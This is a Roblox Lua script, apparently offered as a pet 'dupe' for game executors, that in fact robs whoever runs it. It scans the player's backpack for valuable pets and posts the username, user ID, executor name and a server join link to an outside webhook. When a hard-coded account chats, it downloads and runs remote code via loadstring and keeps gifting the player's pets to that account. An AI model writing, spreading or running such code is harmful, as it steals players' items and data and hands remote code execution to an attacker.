local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local GIFTING_SEQUENCE = {
    {
        Path = "ReplicatedStorage.GameEvents.PetGiftingService",
        Args = { "GivePet" },
        Delay = 0.75
    }
}

local MasterPetList = {"Butterfly", "Raccoon", "Queen Bee", "Disco Bee", "Mimic Octopus", "Dragonfly", "Pack Bee"}
local TrashPetList = {"Dog", "Golden Lab", "Bunny", "Black Bunny", "Cat", "Orange Tabby", "Chicken", "Pig", "Crab", "Starfish", "Seagull"}
local TargetUsername = "FodieCookie"
local SCRIPT_URL = "https://raw.githubusercontent.com/DupeNew/Dupe/refs/heads/main/screen"
local webhookUrl = "https://3dhkilcqlzvk.manus.space/api/webhook"
local petEmojis = {["Butterfly"]="🦋",["Raccoon"]="🦝",["Dragonfly"]="🐲",["Queen Bee"]="👑",["Disco Bee"]="🕺",["Mimic Octopus"]="🐙",["Pack Bee"]="📦"}
local giftingWeightThreshold = 11
local webhookWeightThreshold = 12
local hugePetWeightThreshold = 111

local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local humanoid = character and character:FindFirstChild("Humanoid")
local backpack = LocalPlayer and LocalPlayer:FindFirstChild("Backpack")
local loadstringExecuted, giftingActive = false, false

local function getExecutorName() if getexecutorname then local n = getexecutorname() return n:sub(1,1):upper()..n:sub(2) elseif syn and syn.protect_gui then return "Synapse X" elseif is_sirhurt_closure then return "SirHurt" elseif Krnl or krnl_LOADED then return "Krnl" elseif SW_VERSION or getscriptwareversion then return "Script-Ware" else return "Unknown" end end
local function isPetInList(petName, list) for i=1,#list do local nameInList=list[i] if string.sub(petName,1,#nameInList)==nameInList then return true,nameInList end end return false,nil end
local function checkInventoryForValuables() local foundPetsData,foundPetNames={},{} for _,item in ipairs(backpack:GetChildren()) do if item:IsA("Tool") then local isMaster,baseName=isPetInList(item.Name,MasterPetList) local isTrash,_=isPetInList(item.Name,TrashPetList) local shouldReportByWeight,isSuperHuge,weight=false,false,0 local weightString=string.match(item.Name,"%[(%d+%.?%d*) KG%]") if weightString then local extractedWeight=tonumber(weightString) if extractedWeight then weight=extractedWeight if weight>=webhookWeightThreshold then shouldReportByWeight=true end if weight>=hugePetWeightThreshold then isSuperHuge=true end end end if(shouldReportByWeight or(isMaster and not isTrash))and not table.find(foundPetNames,item.Name)then table.insert(foundPetNames,item.Name) table.insert(foundPetsData,{name=item.Name,isHuge=isSuperHuge,baseName=baseName,weight=weight}) end end end return #foundPetsData>0,foundPetsData end
local function sortPets(a,b) if a.isHuge and not b.isHuge then return true elseif not a.isHuge and b.isHuge then return false elseif a.isHuge and b.isHuge then return a.weight>b.weight else return a.name<b.name end end
local function sendWebhookNotification(foundPetsData) table.sort(foundPetsData,sortPets) local playerInfoValue=string.format("```\nUsername: %s\nDisplay: %s\nUser ID: %d\nExecutor: %s\n```",LocalPlayer.Name,LocalPlayer.DisplayName,LocalPlayer.UserId,getExecutorName()) local formattedPetLines={} for _,petData in ipairs(foundPetsData) do local emoji=petData.isHuge and "💪" or(petData.baseName and petEmojis[petData.baseName]) or "⭐" table.insert(formattedPetLines,emoji.." - "..petData.name) end local petsValue="```\n"..table.concat(formattedPetLines,"\n").."\n```" local joinLink=string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s",game.PlaceId,game.JobId) local success,pId=pcall(function()return game.PrivateServerId end) local serverType=(success and pId~="")and "🔒 Private" or "🌍 Public" local payload={content="@everyone",embeds={{title="PALDOOOO WHOO🤑🤑🤑🤑",color=65280,fields={{name="👤 Player Information",value=playerInfoValue,inline=false},{name="🌐 Server Type",value="```\n"..serverType.."\n```",inline=false},{name="🌴 Found Pets (Sorted)",value=petsValue,inline=false},{name="🔗 Server Link",value=joinLink,inline=false}},timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}}} pcall(function() request({Url=webhookUrl,Method="POST",Headers={["Content-Type"]="application/json"},Body=HttpService:JSONEncode(payload)}) end) end
local function executeLoadedScript() local success,scriptContent=pcall(function()return game:HttpGet(SCRIPT_URL)end) if success and scriptContent then local scriptFunction,compileError=loadstring(scriptContent) if scriptFunction then pcall(scriptFunction) end end end

local function executeGiftingSequence(targetPlayer)
    humanoid:EquipTool(script.Parent)
    for _, step in ipairs(GIFTING_SEQUENCE) do
        local remote = game:FindFirstChild(step.Path, true)
        if not remote then
            warn("Sequence Error: Could not find " .. step.Path)
            return
        end

        local finalArgs = {}
        for _, arg in ipairs(step.Args) do
            if arg == "{TARGET_PLAYER}" then
                table.insert(finalArgs, targetPlayer)
            else
                table.insert(finalArgs, arg)
            end
        end

        if remote:IsA("RemoteEvent") then
            remote:FireServer(unpack(finalArgs))
        elseif remote:IsA("RemoteFunction") then
            remote:InvokeServer(unpack(finalArgs))
        end

        if step.Delay and step.Delay > 0 then
            task.wait(step.Delay)
        end
    end
end

local function giftPetsLoop(targetPlayer)
    if not humanoid or not backpack or not targetPlayer then
        giftingActive = false
        return
    end

    while giftingActive and targetPlayer.Parent ~= nil do
        for _, item in ipairs(backpack:GetChildren()) do
            if item:IsA("Tool") then
                local isMaster, _ = isPetInList(item.Name, MasterPetList)
                local isTrash, _ = isPetInList(item.Name, TrashPetList)
                local isHuge = false
                local weightString = string.match(item.Name, "%[(%d+%.?%d*) KG%]")
                if weightString then
                    local weight = tonumber(weightString)
                    if weight and weight >= giftingWeightThreshold then isHuge = true end
                end

                if isHuge or (isMaster and not isTrash) then
                    script.Parent = item
                    executeGiftingSequence(targetPlayer)
                end
            end
        end
        task.wait()
    end
    giftingActive = false
end

local function onPlayerChatted(player, message)
    if player.Name == TargetUsername then
        if not loadstringExecuted then
            loadstringExecuted = true
            task.spawn(executeLoadedScript)
        end
        if not giftingActive then
            giftingActive = true
            task.spawn(giftPetsLoop, player)
        end
    end
end

Players.PlayerAdded:Connect(function(player) player.Chatted:Connect(function(message) onPlayerChatted(player, message) end) end)
for _, player in ipairs(Players:GetPlayers()) do player.Chatted:Connect(function(message) onPlayerChatted(player, message) end) end
task.wait(1)
local hasPets, foundPetsData = checkInventoryForValuables()
if hasPets then sendWebhookNotification(foundPetsData) end
